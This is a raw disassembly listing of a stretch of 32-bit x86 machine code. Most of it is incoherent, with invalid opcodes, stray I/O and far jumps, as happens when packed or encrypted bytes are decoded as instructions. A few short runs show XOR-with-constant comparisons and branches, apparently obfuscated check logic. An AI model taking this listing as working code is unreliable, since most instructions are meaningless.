  416266:	add    bh,BYTE PTR [eax-0x33105ad3]
  41626c:	and    eax,DWORD PTR [edi+0x1a]
  41626f:	popa   
  416270:	pushf  
  416271:	sub    ebx,DWORD PTR [ecx+0x48559641]
  416277:	xchg   edi,eax
  416278:	shl    DWORD PTR [edx+0x12],cl
  41627b:	cs cdq 
  41627d:	or     al,0x3c
  41627f:	pop    esp
  416280:	xchg   edx,eax
  416281:	stos   DWORD PTR es:[edi],eax
  416282:	repz sbb ebp,DWORD PTR [ebx]
  416285:	jns    0x41621d
  416287:	mov    ah,0xea
  416289:	js     0x4162a1
  41628b:	jg     0x41626a
  41628d:	lock sub DWORD PTR [esi-0x29b21336],ebx
  416294:	cmc    
  416295:	addr16 mov al,ds:0x5c9d
  416299:	xchg   ebp,eax
  41629a:	(bad)  
  41629b:	push   ecx
  41629c:	cmp    DWORD PTR [ecx+0x816ad59],ebp
  4162a2:	lds    ebp,FWORD PTR [ebx-0x50d30bf6]
  4162a8:	inc    edi
  4162a9:	add    eax,0xfe1faa1e
  4162ae:	adc    eax,0x49ab8ea5
  4162b3:	adc    DWORD PTR [ebx],edx
  4162b5:	pop    ebp
  4162b6:	data16 ffree st(7)
  4162b9:	out    dx,al
  4162ba:	test   al,0xe0
  4162bc:	test   BYTE PTR [ecx-0x18],ah
  4162bf:	mov    dl,0x1e
  4162c1:	cmp    eax,0x5111bd13
  4162c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c7:	xor    eax,0x4b39b312
  4162cc:	xchg   ebp,eax
  4162cd:	sbb    cl,bl
  4162cf:	(bad)  
  4162d0:	sbb    DWORD PTR [esi],ebp
  4162d2:	int3   
  4162d3:	mov    esi,0xd28f3f6e
  4162d8:	nop
  4162d9:	dec    esi
  4162da:	mov    edi,0x79ee9720
  4162df:	sahf   
  4162e0:	pop    esp
  4162e1:	jae    0x416362
  4162e3:	inc    ebx
  4162e4:	iret   
  4162e5:	lock pop esi
  4162e7:	sti    
  4162e8:	jno    0x416353
  4162ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162eb:	jl     0x416293
  4162ed:	push   ebp
  4162ee:	inc    edx
  4162ef:	xor    al,0xb5
  4162f1:	dec    esi
  4162f2:	or     BYTE PTR [eax],0x70
  4162f5:	and    dl,BYTE PTR cs:[ecx+0x58]
  4162f9:	jb     0x41629f
  4162fb:	jmp    0x4162be
  4162fd:	dec    edx
  4162fe:	sti    
  4162ff:	ror    BYTE PTR [eax],0x64
  416302:	(bad)  
  416304:	mov    dl,0xec
  416306:	mov    dh,0x3d
  416308:	xchg   esp,eax
  416309:	pushf  
  41630a:	and    BYTE PTR [ecx],dh
  41630c:	mov    ah,0x38
  41630e:	ins    BYTE PTR es:[edi],dx
  41630f:	repz cmp DWORD PTR es:[edi+edi*1+0x11],esp
  416315:	fisttp QWORD PTR [edi-0x1c]
  416318:	fwait
  416319:	ds (bad) 
  41631b:	in     eax,dx
  41631c:	or     dl,ah
  41631e:	xor    DWORD PTR [esi],eax
  416320:	mov    ebp,0xbaea4949
  416325:	xchg   DWORD PTR [edi],ebp
  416327:	imul   eax,DWORD PTR [ebx],0x50b8b360
  41632d:	(bad)
  416330:	and    al,0xd9
  416332:	call   0x61ed:0x21612678
  416339:	mov    ecx,DWORD PTR [ebx]
  41633b:	mov    DWORD PTR [ebp+0x14],edi
  41633e:	mov    edi,DWORD PTR [ebx+0x4]
  416341:	xor    ecx,0xba699573
  416347:	xor    edi,0x9c0a89d8
  41634d:	shrd   ecx,edi,0x2
  416351:	or     ecx,DWORD PTR [ebp+0x10]
  416354:	shr    edi,0x2
  416357:	mov    DWORD PTR [ebp-0x70],ecx
  41635a:	mov    ecx,edi
  41635c:	or     ecx,DWORD PTR [ebp+0x14]
  41635f:	mov    DWORD PTR [ebp+0xc],edi
  416362:	cmp    edx,DWORD PTR [ebp-0x70]
  416365:	jne    0x41a17f
  41636b:	cmp    DWORD PTR [ebp-0x64],ecx
  41636e:	jne    0x41a17f
  416374:	jmp    0x41854e
  416379:	mov    eax,DWORD PTR [esi]
  41637b:	mov    edx,DWORD PTR [esi+0x4]
  41637e:	mov    eax,DWORD PTR [esi]
  416380:	mov    edx,DWORD PTR [esi+0x4]
  416383:	jmp    0x41690d
  416388:	and    DWORD PTR [ecx-0x37],ebp
  41638b:	mov    esp,0x68181cb9
  416390:	loopne 0x4163ad
  416392:	lods   al,BYTE PTR ds:[esi]
  416393:	scas   al,BYTE PTR es:[edi]
  416394:	loope  0x4163d9
  416396:	jbe    0x416346
  416398:	dec    ebp
  416399:	scas   eax,DWORD PTR es:[edi]
  41639a:	or     al,0x16
  41639c:	cmp    eax,0x30161604
  4163a1:	add    cl,al
  4163a3:	aaa    
  4163a4:	pop    ds
  4163a5:	sbb    ch,0x8c
  4163a8:	loope  0x4163b9
  4163aa:	jns    0x416403
  4163ac:	in     eax,0xad
  4163ae:	inc    ebp
  4163af:	es push 0xffffffce
  4163b2:	mov    ch,0x4b
  4163b4:	cld    
  4163b5:	sub    al,BYTE PTR [ebx]
  4163b7:	iret   
  4163b8:	stos   DWORD PTR es:[edi],eax
  4163b9:	sub    eax,0x891e41b9
  4163be:	mov    WORD PTR [esi+0x55],fs
  4163c1:	inc    ebp
  4163c2:	divps  xmm1,XMMWORD PTR [eax-0x2d935c3d]
  4163c9:	imul   edi,esp,0x98e5eb5c
  4163cf:	inc    edi
  4163d0:	ss gs arpl bx,dx
  4163d4:	int    0x45
  4163d6:	push   0x62
  4163d8:	pop    edx
  4163d9:	nop
  4163da:	push   edx
  4163db:	int3   
  4163dc:	sub    DWORD PTR [esi+0x381a0852],edx
  4163e2:	adc    BYTE PTR [ecx+ebx*2+0x35],al
  4163e6:	retf   0x4c15
  4163e9:	jbe    0x416399
  4163eb:	cmp    al,0xd5
  4163ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163ee:	mov    ebp,0x16ee5926
  4163f4:	ret    0x5f50
  4163f7:	arpl   WORD PTR es:[ecx+ecx*8-0x3b00cd67],dx
  4163ff:	sbb    esi,0x40
  416402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416403:	mov    ch,0xd
  416405:	fistp  WORD PTR [ecx+eax*4]
  416408:	sbb    al,0xdf
  41640a:	xchg   ebx,eax
  41640b:	test   al,0x57
  41640d:	xor    DWORD PTR [eax-0x38],eax
  416410:	mov    ss,ebx
  416412:	mov    edx,DWORD PTR [edx+0x296f8b0]
  416418:	repnz data16 mov BYTE PTR [ebp+0x6a],cl
  41641d:	mov    ebp,0x8860c856
  416422:	mov    esp,0x208f245b
  416427:	pop    ss
  416428:	int    0xc3
  41642a:	inc    ebp
  41642b:	in     al,0x86
  41642d:	aad    0xe9
  41642f:	retf   
  416430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416431:	cwde   
  416432:	mov    ebx,0xdcc4746
  416437:	test   BYTE PTR [edx+0x6819311b],cl
  41643d:	jl     0x416417
  41643f:	cmp    BYTE PTR [eax+0x71],bh
  416442:	add    bh,BYTE PTR [eax+ebx*2]
  416445:	push   es
  416446:	mov    bl,0x98
  416448:	jmp    0x30ae52e6
  41644d:	push   es
  41644e:	fnstcw WORD PTR [esp-0x30]
  416452:	jmp    FWORD PTR [edi]
  416454:	or     ah,BYTE PTR [edx]
  416456:	sahf   
  416457:	iret   
  416458:	faddp  st(0),st
  41645a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41645c:	shl    DWORD PTR [esi+0x64],1
  41645f:	fwait
  416460:	cs push ss
  416462:	dec    ecx
  416463:	popa   
  416464:	lea    eax,[eax+0x1a]
  416467:	ins    DWORD PTR es:[edi],dx
  416468:	add    BYTE PTR [ecx+0x31],bh
  41646b:	inc    eax
  41646c:	popf   
  41646d:	push   0x4c
  41646f:	arpl   WORD PTR [ebp+0x1bef844d],dx
  416475:	adc    BYTE PTR [esi-0x7d90749a],bl
  41647b:	inc    eax
  41647c:	push   edi
  41647d:	out    dx,eax
  41647e:	lods   eax,DWORD PTR gs:[esi]
  416480:	xchg   ebx,eax
  416481:	mov    bh,0x1d
  416483:	pop    es
  416484:	sub    al,BYTE PTR [ebx-0x79]
  416487:	cmc    
  416488:	int    0x32
  41648a:	cwde   
  41648b:	xchg   edx,eax
  41648c:	and    al,0x2a
  41648e:	add    BYTE PTR ds:0xa63bc904,ah
  416494:	adc    ecx,esi
  416496:	and    eax,0x827efac2
  41649b:	mov    ebx,0xdd32ab8b
  4164a0:	lods   al,BYTE PTR ds:[esi]
  4164a1:	out    0x64,al
  4164a3:	mov    ds:0x3f298040,eax
  4164a8:	mov    ah,0xb3
  4164aa:	in     eax,dx
  4164ab:	sub    eax,0xdbc6bfa0
  4164b0:	cmp    ch,BYTE PTR [ebx-0x197528c]
  4164b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164b7:	fisubr DWORD PTR [eax-0x53b459f3]
  4164bd:	sub    eax,0x9186a8e6
  4164c2:	mov    al,0xe6
  4164c4:	sub    al,0x73
  4164c6:	(bad)  
  4164c7:	popa   
  4164c8:	(bad)  
  4164c9:	xor    eax,0x2c7896c0
  4164ce:	fcmovb st,st(4)
  4164d0:	pop    ds
  4164d1:	ja     0x416551
  4164d3:	pop    eax
  4164d4:	cmp    DWORD PTR [esi+0x18],edx
  4164d7:	pop    esi
  4164d8:	and    ecx,ebx
  4164da:	lds    ebp,FWORD PTR [eax]
  4164dc:	and    eax,0x26dff900
  4164e1:	push   edi
  4164e2:	in     eax,0x30
  4164e4:	push   ss
  4164e5:	sar    DWORD PTR [edx],cl
  4164e7:	in     al,0x8b
  4164e9:	ins    DWORD PTR es:[edi],dx
  4164ea:	sub    BYTE PTR [ecx],dh
  4164ec:	add    dl,BYTE PTR [eax+0x4b]
  4164ef:	stos   BYTE PTR es:[edi],al
  4164f0:	loope  0x4164a5
  4164f2:	fdiv   DWORD PTR [ebp-0x3d]
  4164f5:	pop    ebp
  4164f6:	rcl    BYTE PTR [edx+0x79],1
  4164f9:	fiadd  WORD PTR [ebx-0xa4356e0]
  4164ff:	inc    esp
  416500:	pop    ebp
  416501:	push   0x1ab235c1
  416506:	mov    edx,0x1a00d9f1
  41650b:	out    dx,eax
  41650c:	xchg   esp,ebx
  41650e:	pop    ebp
  41650f:	dec    eax
  416510:	sti    
  416511:	xchg   DWORD PTR [edi+0x33b2f510],ebx
  416517:	lahf   
  416518:	daa    
  416519:	push   es
  41651a:	hlt    
  41651b:	(bad)  
  41651c:	cli    
  41651d:	repnz pop esi
  41651f:	mov    ds:0xc2f1e2b0,al
  416524:	jne    0x41655d
  416526:	add    dh,al
  416528:	je     0x4164f9
  41652a:	mov    BYTE PTR [edi-0x17],bh
  41652d:	sbb    ecx,0xc03cc2e2
  416533:	and    DWORD PTR [eax+ebp*1+0x12],ebx
  416537:	add    ecx,ebp
  416539:	sub    bh,BYTE PTR [ecx+0x65]
  41653c:	cwde   
  41653d:	xchg   ebx,eax
  41653e:	ss mov dl,0xee
  416541:	xor    BYTE PTR [ebx-0x57],ah
  416544:	xchg   ecx,eax
  416545:	loope  0x41657a
  416547:	inc    ebp
  416548:	jge    0x41655d
  41654a:	xchg   ecx,eax
  41654b:	dec    ebp
  41654c:	push   0x7e97b699
  416551:	pop    eax
  416552:	jno    0x416500
  416554:	pop    ds
  416555:	pushf  
  416556:	jbe    0x416563
  416558:	jo     0x416525
  41655a:	cmp    DWORD PTR [eax+0x6f],edx
  41655d:	xor    ebx,DWORD PTR [esi+ecx*8+0x4c88acc]
  416564:	jge    0x416579
  416566:	and    BYTE PTR [ecx],dh
  416568:	aad    0x4e
  41656a:	mov    bl,0x9d
  41656c:	inc    esi
  41656d:	out    0xa4,eax
  41656f:	or     cl,dl
  416571:	sbb    BYTE PTR [eax],dl
  416573:	popa   
  416574:	push   cs
  416575:	test   DWORD PTR [edi-0x1fc3c363],esi
  41657b:	push   edi
  41657c:	cdq    
  41657d:	into   
  41657e:	sbb    al,0xbb
  416580:	mov    eax,0xe87277e9
  416585:	jo     0x41654d
  416587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416588:	fs and al,0x53
  41658b:	stc    
  41658c:	and    cl,BYTE PTR [edx]
  41658e:	clc    
  41658f:	sbb    al,BYTE PTR [esi+0x1b068527]
  416595:	das    
  416596:	jle    0x416592
  416598:	and    ebx,DWORD PTR [eax]
  41659a:	adc    esi,esi
  41659c:	mov    ds:0x1dd0d3b,al
  4165a1:	bound  ebx,QWORD PTR [ebx+0x6c88e146]
  4165a7:	retf   0x1301
  4165aa:	(bad)  
  4165ab:	pop    ebx
  4165ac:	add    DWORD PTR [eax-0x49],edx
  4165af:	stos   BYTE PTR es:[edi],al
  4165b0:	add    ebx,esi
  4165b2:	pop    ecx
  4165b3:	pusha  
  4165b4:	aas    
  4165b5:	les    ecx,FWORD PTR [edi]
  4165b7:	mov    ds:0x12fb0e95,eax
  4165bc:	fwait
  4165bd:	ins    DWORD PTR es:[edi],dx
  4165be:	sar    esi,cl
  4165c0:	pusha  
  4165c1:	out    dx,al
  4165c2:	jp     0x416634
  4165c4:	(bad)  [edx]
  4165c6:	outs   dx,DWORD PTR ds:[esi]
  4165c7:	sub    esi,DWORD PTR [edi+0x32]
  4165ca:	ret    0xd094
  4165cd:	push   ebx
  4165ce:	xchg   ebp,eax
  4165cf:	cmp    eax,DWORD PTR [eax-0x16]
  4165d2:	lds    esi,FWORD PTR [esi]
  4165d4:	add    al,0x2f
  4165d6:	add    cl,BYTE PTR [edx-0x2b]
  4165d9:	cmp    DWORD PTR [esi-0x30],esi
  4165dc:	and    al,0x23
  4165de:	mov    ds:0xd6eadc17,eax
  4165e3:	dec    ecx
  4165e4:	sbb    eax,0xdfd84e3c
  4165e9:	mov    esi,0xc989bce3
  4165ee:	icebp  
  4165ef:	add    edi,DWORD PTR [edi]
  4165f1:	jmp    0x416672
  4165f3:	inc    ecx
  4165f4:	jbe    0x416604
  4165f6:	push   esp
  4165f7:	xor    eax,0x866b2c24
  4165fc:	sbb    eax,DWORD PTR [ebp+edx*1+0x7c]
  416600:	cmp    dh,BYTE PTR [ebp-0x207d78d1]
  416606:	(bad)  
  416607:	push   ds
  416608:	mov    es,WORD PTR [ebp+0x24]
  41660b:	xchg   esp,eax
  41660c:	mov    ds:0xb0a7f007,eax
  416611:	and    al,0xc4
  416613:	retf   0xdd50
  416616:	(bad)  
  416617:	rol    BYTE PTR [ecx],cl
  416619:	jb     0x416616
  41661b:	xchg   ebp,eax
  41661c:	div    BYTE PTR [ebx]
  41661e:	fsubp  st(2),st
  416620:	fcmovne st,st(1)
  416622:	frstor [eax+0x34]
  416625:	stc    
  416626:	aas    
  416627:	and    eax,DWORD PTR [edi]
  416629:	ja     0x416634
  41662b:	inc    ecx
  41662c:	ss inc ebp
  41662e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41662f:	outs   dx,BYTE PTR ds:[esi]
  416630:	scas   al,BYTE PTR es:[edi]
  416631:	sahf   
  416632:	mov    ah,0x76
  416634:	push   ebx
  416635:	nop
  416636:	mov    ebp,0x7340b799
  41663b:	sub    DWORD PTR [esi],eax
  41663d:	xor    eax,0x8c6d52e6
  416642:	or     dl,bl
  416644:	adc    edi,DWORD PTR [eax]
  416646:	or     al,0xf8
  416648:	dec    esi
  416649:	jo     0x4165dc
  41664b:	or     ebp,edx
  41664d:	mov    ds:0x370995d3,eax
  416652:	mov    eax,ds:0x44ae7a08
  416657:	mov    bl,0x3a
  416659:	push   ebp
  41665a:	mov    bh,0xef
  41665c:	retf   0xfb45
  41665f:	test   BYTE PTR [ebp+0x54592634],0xf5
  416666:	(bad)  [ecx]
  416668:	repz xor eax,0xcedc1491
  41666e:	mov    ds:0xc2f222cc,eax
  416673:	jp     0x416607
  416675:	jae    0x4166ad
  416677:	mov    al,ds:0x13aa857
  41667c:	push   es
  41667d:	jge    0x4166e3
  41667f:	jp     0x4166bc
  416681:	cmp    esi,edx
  416683:	inc    esp
  416684:	pop    ax
  416686:	mov    ah,0x59
  416688:	stc    
  416689:	arpl   bx,bx
  41668b:	jl     0x4166c2
  41668d:	jb     0x41670b
  41668f:	pop    ecx
  416690:	ins    BYTE PTR es:[edi],dx
  416691:	pop    edx
  416692:	sti    
  416693:	mov    ch,0xd0
  416695:	scas   eax,DWORD PTR es:[edi]
  416696:	add    BYTE PTR [edi-0x4c6b92ec],cl
  41669c:	inc    ecx
  41669d:	xlat   BYTE PTR ds:[ebx]
  41669e:	leave  
  41669f:	test   BYTE PTR [ebx-0x7b42cd09],ch
  4166a5:	add    ebx,esi
  4166a7:	and    ecx,DWORD PTR [edx-0x5a]
  4166aa:	ror    DWORD PTR ds:0x9e993ffc,cl
  4166b0:	or     DWORD PTR gs:[edx+0x7f],0x67843f5a
  4166b8:	dec    DWORD PTR [ebx-0x5602e898]
  4166be:	js     0x416730
  4166c0:	push   cs
  4166c1:	out    0xc3,eax
  4166c3:	cdq    
  4166c4:	jle    0x416724
  4166c6:	ror    DWORD PTR [ebx-0x9],1
  4166c9:	push   0xffffff98
  4166cb:	lock push 0x37
  4166ce:	fidiv  DWORD PTR [edi-0x20]
  4166d1:	mov    edx,0xde31ea4f
  4166d6:	jbe    0x4166fe
  4166d8:	cmp    DWORD PTR [edi],edx
  4166da:	mov    eax,ds:0xcaabd5bd
  4166df:	dec    eax
  4166e0:	cmp    DWORD PTR [ecx+0x41],0xc67453b3
  4166e7:	ins    DWORD PTR es:[edi],dx
  4166e8:	pushf  
  4166e9:	fadd   DWORD PTR [eax-0x5d]
  4166ec:	adc    esi,ebp
  4166ee:	out    0xb2,eax
  4166f0:	sbb    esi,DWORD PTR [esi-0x14]
  4166f3:	inc    edx
  4166f4:	test   eax,0x5310da57
  4166f9:	retf   
  4166fa:	int3   
  4166fb:	test   DWORD PTR [edi-0xd],ecx
  4166fe:	cmp    al,0x92
  416700:	js     0x41669d
  416702:	push   es
  416703:	mov    WORD PTR [ebp-0x5bc22f35],ss
  416709:	xchg   ebp,eax
  41670a:	jmp    0x4166ab
  41670c:	jecxz  0x41677c
  41670e:	and    DWORD PTR [esi-0x713a2a3a],ecx
  416714:	jno    0x41673e
  416716:	adc    bl,dl
  416718:	(bad)  
  416719:	adc    edi,ebx
  41671b:	(bad)  
  41671c:	dec    ebp
  41671d:	mov    ecx,0x1731ce40
  416722:	and    eax,ebp
  416724:	mov    dl,0x84
  416726:	mov    ss,WORD PTR ds:0x84a439f0
  41672c:	sti    
  41672d:	shl    DWORD PTR [ecx+0x784fb41c],0xa9
  416734:	cmc    
  416735:	test   esp,eax
  416737:	and    DWORD PTR [ebp-0x30],ebx
  41673a:	mov    bl,0x4b
  41673c:	or     BYTE PTR [eax-0x5b05a2b],dl
  416742:	popf   
  416743:	pop    edi
  416744:	(bad)  
  416745:	leave  
  416746:	clc    
  416747:	addr16 int3 
  416749:	sub    al,al
  41674b:	es cmp esi,ecx
  41674e:	sar    DWORD PTR [edi],0xdf
  416751:	adc    BYTE PTR [ebx-0x1d],ah
  416754:	loope  0x4166e9
  416756:	loop   0x4166f5
  416758:	fild   DWORD PTR [ecx-0x103af0e0]
  41675e:	(bad)  
  41675f:	test   al,0xd5
  416761:	icebp  
  416762:	cmp    cl,BYTE PTR [eax-0x51]
  416765:	clc    
  416766:	(bad)  
  416767:	xchg   BYTE PTR [ebx-0x7bfdfe19],dh
  41676d:	repz cmp al,0xd6
  416770:	arpl   bx,si
  416772:	scas   al,BYTE PTR es:[edi]
  416773:	jns    0x416795
  416775:	add    BYTE PTR [ebx+0x5aa737e4],ch
  41677b:	jecxz  0x41674f
  41677d:	sub    BYTE PTR [ebx+eax*2+0x3d9d6adc],dl
  416784:	lahf   
  416785:	ja     0x4167b0
  416787:	adc    DWORD PTR [eax],0x31
  41678a:	retf   0xe93
  41678d:	out    0x97,eax
  41678f:	xchg   esi,eax
  416790:	xor    BYTE PTR [eax],0x88
  416793:	in     al,0xe7
  416795:	pop    eax
  416796:	das    
  416797:	sar    DWORD PTR [edx+0x54],1
  41679a:	xor    al,0x59
  41679c:	push   es
  41679d:	and    al,ah
  41679f:	rol    esi,1
  4167a1:	scas   al,BYTE PTR es:[edi]
  4167a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167a3:	cmp    bh,cl
  4167a5:	scas   eax,DWORD PTR es:[edi]
  4167a6:	pop    edi
  4167a7:	sub    ebp,DWORD PTR [edi]
  4167a9:	mov    esp,DWORD PTR [eax+eax*1+0x28251fab]
  4167b0:	scas   al,BYTE PTR es:[edi]
  4167b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167b2:	xchg   DWORD PTR [ebx+0x29c8b5bf],ebx
  4167b8:	outs   dx,BYTE PTR ds:[esi]
  4167b9:	add    BYTE PTR [esi-0x27],0x59
  4167bd:	mov    cl,ah
  4167bf:	fidiv  DWORD PTR [ecx+0x59]
  4167c2:	ja     0x4167ec
  4167c4:	pop    edi
  4167c5:	stc    
  4167c6:	dec    edx
  4167c7:	push   edi
  4167c8:	push   es
  4167c9:	or     ch,BYTE PTR [edx]
  4167cb:	fild   DWORD PTR [ebx]
  4167cd:	ins    BYTE PTR es:[edi],dx
  4167ce:	sbb    ecx,edx
  4167d0:	iret   
  4167d1:	xor    ebp,ecx
  4167d3:	int    0x76
  4167d5:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167d7:	and    BYTE PTR [edx*4+0x22402d4a],dl
  4167de:	sub    BYTE PTR [ecx+0x58bfb1d7],ch
  4167e4:	in     eax,dx
  4167e5:	xor    edi,DWORD PTR [eax-0x1406176b]
  4167eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167ec:	mov    esp,0xea6c379d
  4167f1:	mov    ch,0x32
  4167f3:	icebp  
  4167f4:	jecxz  0x416785
  4167f6:	js     0x416806
  4167f8:	ds nop
  4167fa:	(bad)  
  4167fb:	xor    eax,0x87719552
  416800:	addr16 xchg edi,eax
  416802:	shl    BYTE PTR [esi+0x6694e58b],1
  416808:	xchg   edx,eax
  416809:	mov    WORD PTR [ebx+0x1123eb6b],es
  41680f:	scas   eax,DWORD PTR es:[edi]
  416810:	(bad)  
  416811:	clc    
  416812:	(bad)
  416815:	and    ebp,ecx
  416817:	xchg   ebp,eax
  416818:	inc    bp
  41681a:	lods   al,BYTE PTR ds:[esi]
  41681b:	sar    al,0x42
  41681e:	jg     0x4167de
  416820:	(bad)  
  416822:	lods   eax,DWORD PTR ds:[esi]
  416823:	mov    ch,0x64
  416825:	pop    esp
  416826:	sub    BYTE PTR [esp+ecx*2],ch
  416829:	sbb    esp,DWORD PTR [ebp+0x5dfaafcd]
  41682f:	and    DWORD PTR [ecx],edi
  416831:	imul   BYTE PTR [edx+0x2333159d]
  416837:	mov    cl,0x37
  416839:	xchg   ebp,eax
  41683a:	and    BYTE PTR [edi],al
  41683c:	mov    dh,dh
  41683e:	xchg   esp,eax
  41683f:	scas   eax,DWORD PTR es:[edi]
  416840:	test   DWORD PTR [eax+ebp*1],ecx
  416843:	xchg   ebx,eax
  416844:	(bad)  
  416845:	dec    eax
  416846:	sti    
  416847:	add    BYTE PTR [ebx+0x74],dh
  41684a:	xor    cl,0x7e
  41684d:	cmp    al,0x81
  41684f:	loope  0x4168a2
  416851:	jl     0x416823
  416853:	mov    al,0xb0
  416855:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  416857:	push   es
  416858:	fsubp  st(5),st
  41685a:	sbb    DWORD PTR [edi-0x4406f68e],ebp
  416860:	mov    cl,0xab
  416862:	test   al,0xf8
  416864:	(bad)  
  416865:	fisubr WORD PTR [ebx]
  416867:	fsubp  st(4),st
  416869:	mov    DWORD PTR [edi+0x5e16fe4b],ebp
  41686f:	adc    eax,0x8dab9cf5
  416874:	outs   dx,BYTE PTR ds:[esi]
  416875:	ret    
  416876:	stos   DWORD PTR es:[edi],eax
  416877:	out    dx,al
  416878:	sahf   
  416879:	pop    ss
  41687a:	jge    0x4168ad
  41687c:	xor    al,0x2c
  41687e:	jmp    0x3f0e:0x45be1feb
  416885:	cld    
  416886:	test   BYTE PTR [esi+0x43d7bba5],dh
  41688c:	push   edx
  41688d:	pop    ds
  41688e:	(bad)  
  416890:	jo     0x416898
  416892:	pusha  
  416893:	ins    BYTE PTR es:[edi],dx
  416894:	hlt    
  416895:	call   0x10be:0xdda614b6
  41689c:	mov    al,ds:0xad6e1827
  4168a1:	inc    edx
  4168a2:	ret    0x53c
  4168a5:	aaa    
  4168a6:	sub    al,0xf2
  4168a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168aa:	mov    edx,0x8d0b6901
  4168af:	sbb    al,0xa5
  4168b1:	push   ebp
  4168b2:	scas   eax,DWORD PTR es:[edi]
  4168b3:	xor    DWORD PTR [esi-0x35],eax
  4168b6:	push   edx
  4168b7:	fmul   QWORD PTR [ebp+0x69]
  4168ba:	mov    cl,0xe4
  4168bc:	adc    al,0xd6
  4168be:	dec    ecx
  4168bf:	jg     0x4168c0
  4168c1:	jl     0x416912
  4168c3:	mov    cl,0x56
  4168c5:	cdq    
  4168c6:	ss xchg esp,eax
  4168c8:	lock loopne 0x41684c
  4168cb:	cld    
  4168cc:	sbb    DWORD PTR [edi-0x7d63b2a6],edx
  4168d2:	pop    ebp
  4168d3:	add    BYTE PTR [esp+esi*2-0x34170fc8],bh
  4168da:	dec    ecx
  4168db:	mov    bl,dl
  4168dd:	pushf  
  4168de:	das    
  4168df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168e0:	mov    bl,0x76
  4168e2:	and    edi,eax
  4168e4:	data16 (bad) 
  4168e6:	push   esi
  4168e7:	or     DWORD PTR [esi],0x4d
  4168ea:	mov    WORD PTR [ecx+0x4b],?
  4168ed:	xor    ch,BYTE PTR [edi+eax*1]
  4168f0:	dec    ebx
  4168f1:	sbb    eax,0x55fc8bf7
  4168f6:	sahf   
  4168f7:	xchg   esi,eax
  4168f8:	jg     0x416885
  4168fa:	imul   eax,DWORD PTR [edi],0x786f10b5
  416900:	xchg   ecx,eax
  416901:	fwait
  416902:	sti    
  416903:	ds aas 
  416905:	pinsrw mm4,WORD PTR [ebx+edi*4-0x3fc8b970],0x8b
  41690e:	shl    BYTE PTR [ebx],1
  416910:	rol    cl,0xe2
  416913:	push   ds
  416914:	mov    DWORD PTR [ebp+0x10],eax
  416917:	mov    eax,DWORD PTR [esi]
  416919:	xor    edx,0xc0000000
  41691f:	mov    DWORD PTR [ebp+0x14],edx
  416922:	mov    edx,DWORD PTR [esi+0x4]
  416925:	jmp    0x416eaf
  41692a:	or     BYTE PTR [edx+0x20a461f6],ch
  416930:	jns    0x416944
  416932:	stc    
  416933:	repz sbb BYTE PTR [eax-0x4d6dbaf8],ch
  41693a:	jp     0x4168d9
  41693c:	or     al,0x16
  41693e:	cmp    eax,0x11161604
  416943:	cli    
  416944:	(bad)  
  416946:	arpl   WORD PTR [edx],bx
  416948:	sub    BYTE PTR [edi],cl
  41694a:	mov    dh,0xe4
  41694c:	jb     0x416957
  41694e:	push   ecx
  41694f:	xchg   edx,eax
  416950:	jl     0x4169af
  416952:	jbe    0x4168e9
  416954:	sti    
  416955:	mov    dh,0x60
  416957:	push   edx
  416958:	inc    esi
  416959:	(bad)  
  41695a:	push   ebp
  41695b:	sbb    al,0xa2
  41695d:	stos   BYTE PTR es:[edi],al
  41695e:	jmp    0xbd859516
  416963:	in     al,0x48
  416965:	sub    edx,DWORD PTR [esi]
  416967:	jae    0x41697b
  416969:	inc    eax
  41696a:	dec    ebp
  41696b:	bnd call 0x5ca85a8a
  416971:	pusha  
  416972:	shr    BYTE PTR [eax-0x715d4715],cl
  416978:	leave  
  416979:	dec    eax
  41697a:	(bad)  
  41697b:	dec    ecx
  41697c:	xor    sp,WORD PTR [edx]
  41697f:	cld    
  416980:	sub    BYTE PTR [esi+0x590dfaa8],cl
  416986:	mov    fs,WORD PTR [edx+ecx*8]
  416989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41698a:	inc    eax
  41698b:	jmp    0x5a5a3045
  416990:	test   al,0x9a
  416992:	leave  
  416993:	jle    0x416a09
  416995:	jp     0x416a10
  416997:	loope  0x4169c3
  416999:	fnstsw ax
  41699b:	or     eax,0x7a54bd29
  4169a0:	jo     0x416945
  4169a2:	nop
  4169a3:	jl     0x416949
  4169a5:	cmc    
  4169a6:	mov    BYTE PTR [ebx-0x4154f71e],dl
  4169ac:	sbb    cl,0x34
  4169af:	cmp    ah,bh
  4169b1:	add    ebp,esp
  4169b3:	or     bl,bl
  4169b5:	mov    dl,0x43
  4169b7:	sar    BYTE PTR [edx-0x28],1
  4169ba:	(bad)  
  4169bb:	retf   
  4169bc:	les    eax,FWORD PTR es:[esp+edi*8-0x1d]
  4169c1:	sub    ebp,0xbfb694c7
  4169c7:	ret    
  4169c8:	or     eax,0x724339bc
  4169cd:	lods   eax,DWORD PTR ds:[esi]
  4169ce:	xor    DWORD PTR [ebp-0x1],eax
  4169d1:	mov    cs,WORD PTR [edx-0xf]
  4169d4:	pop    eax
  4169d5:	and    ebx,DWORD PTR [ecx]
  4169d7:	shl    BYTE PTR [ebp+edx*4+0x59531d64],0x40
  4169df:	retf   0x425
  4169e2:	clc    
  4169e3:	jns    0x4169eb
  4169e5:	mov    ecx,DWORD PTR [ebx-0x296f9048]
  4169eb:	pushf  
  4169ec:	dec    ecx
  4169ed:	add    eax,0xe8e6fb2e
  4169f2:	push   ebp
  4169f3:	and    dl,BYTE PTR [ecx]
  4169f5:	jl     0x416a24
